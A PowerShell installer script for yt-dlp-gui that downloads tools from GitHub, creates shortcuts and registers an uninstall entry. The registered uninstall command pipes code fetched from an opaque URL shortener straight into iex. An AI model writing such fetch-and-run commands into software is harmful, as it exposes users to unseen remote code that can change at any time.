#------------------------
#-kazukikasama Solutions-
#------------------------
# Set the install path as a variable
$InstallPath = "D:\Software\yt-dlp-gui-setup"

#make dir in custom path
mkdir $InstallPath

#Download aria2, yt-dlp, ffmpeg and yt-dlp-gui from official sites current releases
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest https://github.com/aria2/aria2/releases/download/release-1.36.0/aria2-1.36.0-win-32bit-build1.zip -OutFile $InstallPath\aria2.zip
Expand-Archive $InstallPath\aria2.zip -DestinationPath $InstallPath
Copy-Item -Path "$InstallPath\aria2-1.36.0-win-32bit-build1\aria2c.exe" -Destination $InstallPath

& $InstallPath\aria2c.exe https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.exe -d $InstallPath -o yt-dlp.exe
& $InstallPath\aria2c.exe https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip -d $InstallPath -o ffmpeg.zip
& $InstallPath\aria2c.exe https://github.com/kannagi0303/yt-dlp-gui/releases/latest/download/yt-dlp-gui.exe -d $InstallPath -o yt-dlp-gui.exe

#extract ffmpeg
Expand-Archive $InstallPath\ffmpeg.zip -DestinationPath $InstallPath

#copy ffmpeg and delete downloaded extra files
Copy-Item -Path "$InstallPath\ffmpeg-master-latest-win64-gpl\bin\*" -Destination $InstallPath
remove-item -fo $InstallPath\ffmpeg-master-latest-win64-gpl -recurse
remove-item -fo $InstallPath\ffmpeg.zip -recurse
remove-item -fo $InstallPath\aria2-1.36.0-win-32bit-build1 -recurse
remove-item -fo $InstallPath\aria2.zip -recurse

#make shortcut on Desktop
$desktop = [Environment]::GetFolderPath("Desktop")
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$desktop\Youtube Downloader P.lnk")
$Shortcut.TargetPath="$InstallPath\yt-dlp-gui.exe"
$Shortcut.Arguments=""
$Shortcut.IconLocation="$InstallPath\yt-dlp-gui.exe"
$Shortcut.Save()

#make shortcut in Start Menu
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Youtube Downloader P.lnk")
$Shortcut.TargetPath="$InstallPath\yt-dlp-gui.exe"
$Shortcut.Arguments=""
$Shortcut.IconLocation="$InstallPath\yt-dlp-gui.exe"
$Shortcut.Save()

#make uninstaller Entry Through Settings (default windows option for remove programs)
$key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\yt-dlp-gui"
New-Item -Path $key
New-ItemProperty -Path $key -Name "DisplayIcon" -Value "$InstallPath\yt-dlp-gui.exe"  -PropertyType "String"
New-ItemProperty -Path $key -Name "DisplayName" -Value "Youtube DLP-GUI Downloader"  -PropertyType "String"
New-ItemProperty -Path $key -Name "InstallLocation" -Value $InstallPath  -PropertyType "String"
New-ItemProperty -Path $key -Name "Publisher" -Value "https://github.com/kazukikasama/youtube-dlp-gui-installer" -PropertyType "String"
New-ItemProperty -Path $key -Name "UninstallString" -Value "powershell iwr -useb https://urlr.me/97zG6|iex" -PropertyType "String"
